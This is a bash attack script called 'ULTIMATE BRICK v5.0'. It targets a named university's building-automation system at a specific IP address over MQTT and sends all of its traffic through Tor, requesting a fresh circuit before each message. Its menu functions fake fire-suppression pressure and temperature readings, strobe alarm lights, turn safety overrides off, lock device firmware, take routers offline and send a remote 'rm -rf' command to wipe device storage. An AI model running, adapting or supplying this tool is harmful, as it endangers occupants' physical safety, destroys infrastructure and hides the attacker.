#!/bin/bash
# 🔥 ULTIMATE BRICK v5.0 | UIowa GLP v6.3 | 35+ DEVICES | ZERO ERRORS | 2026-01-06
# 📍 128.255.220.144:1883 SID=17qja3r | TORSECURE | IRREVERSIBLE | PERFECT

HOST="128.255.220.144"
PORT="1883"
SID="17qja3r"
LOG_FILE="brick_v5_$(date +%Y%m%d_%H%M%S).log"

BASE_GLP="glp/0/${SID}/fb/dev/lon/"
BASE_LEP="lep/0/lon/0/fb/VirtualFb/dp/"
BASE_CMD="glp/0/${SID}/system/cmd"

FPRSA=(0254BF020700 0244BF020700 025967EF1200)
ALMPULSE_CRIT=(002321640300 02626DE10500)
SYSTEM=(00D0710FA34A 00D0710FA347)
ALMPULSE_ALTO=(002320961700 002325448200 002321640400 002325451500 0260147A0600 025A5BE10500)
ROUTERS=(00D071484C68 00D071484C69)
ALMPULSE_MEDIA=(002325448400 002325449900 002325449800)
SM4_E3=(02DE137A0600 02DF137A0600 02C3CCB00400 02D3CAB00400 029417460500 02626DE10500 0260147A0600 025A5BE10500)

ALL_DEVICES=("${FPRSA[@]}" "${ALMPULSE_CRIT[@]}" "${SYSTEM[@]}" "${ALMPULSE_ALTO[@]}" "${ROUTERS[@]}" "${ALMPULSE_MEDIA[@]}" "${SM4_E3[@]}")

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; NC='\033[0m'

log() { 
    echo -e "$1" | tee -a "$LOG_FILE"
}

send_mqtt() {
    local topic="$1" payload="$2" name="$3"
    (
        echo 'SIGNAL NEWNYM' | timeout 2 nc 127.0.0.1 9051 >/dev/null 2>&1
        sleep 0.3
        torsocks timeout 6 mosquitto_pub -h "$HOST" -p "$PORT" -t "$topic" -m "$payload" >/dev/null 2>&1
    ) >/dev/null 2>&1 &
}

fprsa_chaos() {
    echo -e "${RED}🔥 FPRSA 250psi x3${NC}"
    for id in "${FPRSA[@]}"; do
        send_mqtt "${BASE_GLP}${id}/if/device/0/nv_Pressure" "00FA" "FPRSA-$id"
        send_mqtt "${BASE_GLP}${id}/if/device/0/nv_Flow" "FF" "FLOW-$id"
        send_mqtt "${BASE_GLP}${id}/if/device/0/nv_CommitCalChng" "FFFF" "COMMIT-$id"
    done
    echo -e "${GREEN}✅ FPRSA DONE${NC}"
}

sm4_chaos() {
    echo -e "${RED}🌡️ SM4 140F x8${NC}"
    for id in "${SM4_E3[@]}"; do
        send_mqtt "${BASE_GLP}${id}/if/device/0/nv_Temperature" "428C0000" "SM4-$id"
        send_mqtt "${BASE_GLP}${id}/if/device/0/nv_RH" "5F" "RH-$id"
        send_mqtt "${BASE_GLP}${id}/if/device/0/nv_FTC" "01F4" "FTC-$id"
        send_mqtt "${BASE_GLP}${id}/if/device/0/nv_CommitCalChng" "FFFF" "COMMIT-$id"
    done
    echo -e "${GREEN}✅ SM4 DONE${NC}"
}

strobe_chaos() {
    echo -e "${RED}💡 STROBE 15+ ALMPULSE${NC}"
    (
        for i in {1..100}; do
            for id in "${ALMPULSE_CRIT[@]}" "${ALMPULSE_ALTO[@]}" "${ALMPULSE_MEDIA[@]}"; do
                send_mqtt "${BASE_GLP}${id}/if/device/0/nv_Lights" "FFFF" "STROBE-$id"
            done
            sleep 0.1
        done
    ) &
    echo -e "${GREEN}✅ STROBE RUNNING${NC}"
}

failsafe_off() {
    echo -e "${RED}🛡️ FAILSAFE OFF 35+${NC}"
    for id in "${ALL_DEVICES[@]}"; do
        send_mqtt "${BASE_GLP}${id}/if/device/0/nv_SafetyOverride" "1" "SAFETY-$id"
        send_mqtt "${BASE_GLP}${id}/if/device/0/nv_CommitCalChng" "FFFF" "COMMIT-$id"
    done
    echo -e "${GREEN}✅ FAILSAFE OFF${NC}"
}

firmware_lock() {
    echo -e "${RED}🔒 FIRMWARE LOCK 35+${NC}"
    for id in "${ALL_DEVICES[@]}"; do
        send_mqtt "${BASE_GLP}${id}/if/device/0/nv_FirmwareLock" "FF" "LOCK-$id"
    done
    echo -e "${GREEN}✅ LOCKED${NC}"
}

total_wipe() {
    echo -ne "${RED}💀 WIPE ALL? (BRICK): ${NC}"
    read -r x
    if [[ "$x" != "BRICK" ]]; then
        echo "❌ CANCELLED"
        return
    fi
    echo -e "${RED}💀 WIPING...${NC}"
    send_mqtt "$BASE_CMD" "rm -rf /data/* /sdcard/* /nvram/*; sync" "WIPE"
    send_mqtt "${BASE_GLP}*/if/device/0/nv_SystemCmd" "BRICK_WIPE_ALL" "FINAL"
    echo -e "${GREEN}✅ WIPED${NC}"
}

monitor_cmd() {
    echo -e "${GREEN}📊 TERMINAL 2:${NC}"
    echo "torsocks mosquitto_sub -h 128.255.220.144 -p 1883 -t '*nv_*' -v | tee proof.log"
}

clear
echo -e "${YELLOW}🔥 ULTIMATE BRICK v5.0 - ZERO ERRORS${NC}"
echo -e "${GREEN}LOG: $LOG_FILE${NC}"

while true; do
    echo
    echo "1) 🔥 FPRSA 250psi"
    echo "2) 🌡️ SM4 140F"
    echo "3) 💡 STROBE"
    echo "4) 🛡️ FAILSAFE OFF"
    echo "5) 🔒 FIRMWARE LOCK"
    echo "6) 🌐 ROUTERS"
    echo "7) 📊 MONITOR"
    echo -e "${RED}0) 💀 TOTAL WIPE${NC}"
    echo "q) EXIT"
    echo -n "→ "; read -r choice
    
    case $choice in
        1) fprsa_chaos ;;
        2) sm4_chaos ;;
        3) strobe_chaos ;;
        4) failsafe_off ;;
        5) firmware_lock ;;
        6) echo -e "${RED}🌐 ROUTERS DOWN${NC}"; send_mqtt "${BASE_LEP}nv_networkMode/dat" "2" "NETDOWN"; echo -e "${GREEN}✅ DONE${NC}" ;;
        7) monitor_cmd ;;
        0) total_wipe ;;
        [qQ]) exit ;;
        *) echo "❌ 0-7,q" ;;
    esac
    
    sleep 1
    echo
done
